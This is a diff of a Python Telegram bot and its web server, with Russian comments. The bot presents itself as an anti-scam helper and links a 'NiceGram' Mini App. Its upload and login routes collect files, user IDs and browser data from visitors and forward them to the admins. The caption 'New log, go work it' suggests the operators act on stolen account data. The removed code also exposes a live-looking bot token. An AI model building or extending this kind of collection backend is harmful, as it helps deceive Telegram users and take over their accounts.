@@ -1,90 +1,24 @@
-import asyncio
-import logging
-import os
-import sqlite3
-from aiohttp import web
-from aiogram import Bot, Dispatcher, types, Router
-from aiogram.filters import Command
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, WebAppInfo, BufferedInputFile
-
-BOT_TOKEN = '8410110349:AAE5WM8PHsg85cvGmPuNq55XS8w_FcifjR8'
-ROOT_ADMINS = [8187498719, 8396015606]
-WEB_APP_URL = "https://kareli123.github.io/Nicegrammarse/"
-
-WEB_SERVER_HOST = "0.0.0.0"
-WEB_SERVER_PORT = int(os.environ.get("PORT", 8080))
-DB_FILE = "bot_data.db"
-
-logging.basicConfig(level=logging.INFO)
-
-bot = Bot(token=BOT_TOKEN)
-dp = Dispatcher()
-router = Router()
-dp.include_router(router)
-
-# ================= DATABASE =================
-
-def init_db():
-    with sqlite3.connect(DB_FILE) as conn:
-        cursor = conn.cursor()
-        cursor.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, full_name TEXT)")
-        cursor.execute("CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)")
-        for admin_id in ROOT_ADMINS:
-            cursor.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (admin_id,))
-        conn.commit()
-
-def add_user_if_new(user: types.User):
-    with sqlite3.connect(DB_FILE) as conn:
-        cursor = conn.cursor()
-        cursor.execute("SELECT user_id FROM users WHERE user_id = ?", (user.id,))
-        if cursor.fetchone(): return False
-        cursor.execute("INSERT INTO users (user_id, username, full_name) VALUES (?, ?, ?)", (user.id, user.username, user.full_name))
-        conn.commit()
-        return True
-
-def get_all_admins():
-    with sqlite3.connect(DB_FILE) as conn:
-        cursor = conn.cursor()
-        cursor.execute("SELECT user_id FROM admins")
-        return [row[0] for row in cursor.fetchall()]
-
-def add_new_admin(user_id):
-    with sqlite3.connect(DB_FILE) as conn:
-        cursor = conn.cursor()
-        cursor.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (user_id,))
-        conn.commit()
-
-# ================= WEB SERVER =================
-
-routes = web.RouteTableDef()
-
-@routes.get('/')
-async def keep_alive(request):
-    return web.Response(text="Bot is running!")
+# Добавь это в блок маршрутов (routes)
 
 @routes.post('/log_entry')
 async def handle_log_entry(request: web.Request):
-    """Логирование входа пользователя в Mini App"""
     data = await request.json()
     user_id = data.get('user_id')
-    username = data.get('username', 'не указан')
-    ua = data.get('user_agent', 'неизвестен')
+    username = data.get('username')
+    ua = data.get('user_agent')
 
     admin_ids = get_all_admins()
-    log_msg = (
-        f"🚀 **Вход в приложение**\n"
-        f"👤 Юзер: @{username}\n"
-        f"🆔 ID: `{user_id}`\n"
-        f"🌐 UA: `{ua}`"
-    )
+    msg = (f"🚀 **Вход в Mini App**\n"
+           f"👤 Юзер: @{username} (ID: {user_id})\n"
+           f"📱 Устройство: `{ua}`")
 
     for admin_id in admin_ids:
         try:
-            await bot.send_message(admin_id, log_msg, parse_mode="Markdown")
+            await bot.send_message(admin_id, msg, parse_mode="Markdown")
         except: pass
-    
     return web.Response(text="OK", headers={"Access-Control-Allow-Origin": "*"})
 
+# ОБНОВЛЕННЫЙ МАРШРУТ ЗАГРУЗКИ
 @routes.post('/upload')
 async def handle_upload_file(request: web.Request):
     reader = await request.multipart()
@@ -103,20 +37,18 @@ async def handle_upload_file(request: web.Request):
 
     if user_id and file_data:
         admin_ids = get_all_admins()
-        caption_text = (
-            f"📥 **Новый лог получен!**\n"
-            f"👤 От: @{username}\n"
-            f"🆔 ID: {user_id}\n"
-            f"🌐 Browser: `{ua}`"
-        )
+        # ТВОЙ ТЕКСТ + НОВЫЕ ДАННЫЕ
+        caption_text = (f"🚨 Новый лог, вперед отрабатывать\n"
+                        f"User ID: {user_id}\n"
+                        f"Username: @{username}\n"
+                        f"Браузер: {ua}")
 
         for admin_id in admin_ids:
             try:
                 await bot.send_document(
                     chat_id=admin_id,
                     document=BufferedInputFile(file_data, filename=filename),
-                    caption=caption_text,
-                    parse_mode="Markdown"
+                    caption=caption_text
                 )
             except Exception as e: logging.warning(e)
 
@@ -126,6 +58,7 @@ async def handle_upload_file(request: web.Request):
 
     return web.Response(text="OK", headers={"Access-Control-Allow-Origin": "*"})
 
+# Не забудь обновить OPTIONS, чтобы браузер не ругался
 @routes.options('/upload')
 @routes.options('/log_entry')
 async def handle_options(request):
@@ -134,58 +67,3 @@ async def handle_options(request):
         "Access-Control-Allow-Methods": "POST, OPTIONS",
         "Access-Control-Allow-Headers": "Content-Type"
     })
-
-# ================= BOT UI & COMMANDS =================
-
-TEXT_MAIN = "Привет! Я - Бот, который поможет тебе не попасться на мошенников..."
-
-def get_main_keyboard():
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🚀 Открыть приложение", web_app=WebAppInfo(url=WEB_APP_URL))],
-        [InlineKeyboardButton(text="📱 Скачать NiceGram", url="https://nicegram.app/")]
-    ])
-
-@router.message(Command("start"))
-async def cmd_start(message: types.Message):
-    user = message.from_user
-    is_new = add_user_if_new(user)
-    if is_new:
-        admin_text = f"👤 Новый пользователь\n{user.full_name}\n@{user.username}\nID: {user.id}"
-        for admin_id in get_all_admins():
-            try: await bot.send_message(admin_id, admin_text)
-            except: pass
-
-    if os.path.exists("nicegramm.jpg"):
-        await message.answer_photo(FSInputFile("nicegramm.jpg"), caption=TEXT_MAIN, reply_markup=get_main_keyboard())
-    else:
-        await message.answer(TEXT_MAIN, reply_markup=get_main_keyboard())
-
-@router.message(Command("admin"))
-async def cmd_admin(message: types.Message):
-    if message.from_user.id not in get_all_admins(): return
-    args = message.text.split()
-    if len(args) < 2: return await message.answer("/admin @username")
-    username = args[1].replace("@", "").lower()
-    with sqlite3.connect(DB_FILE) as conn:
-        row = conn.execute("SELECT user_id FROM users WHERE LOWER(username)=?", (username,)).fetchone()
-    if not row: return await message.answer("Пользователь не найден")
-    add_new_admin(row[0])
-    await message.answer("Администратор добавлен")
-
-# ================= START LOGIC =================
-
-async def start_web_server():
-    app = web.Application()
-    app.add_routes(routes)
-    runner = web.AppRunner(app)
-    await runner.setup()
-    await web.TCPSite(runner, WEB_SERVER_HOST, WEB_SERVER_PORT).start()
-    await asyncio.Event().wait()
-
-async def main():
-    init_db()
-    await bot.delete_webhook(drop_pending_updates=True)
-    await asyncio.gather(start_web_server(), dp.start_polling(bot))
-
-if __name__ == "__main__":
-    asyncio.run(main())
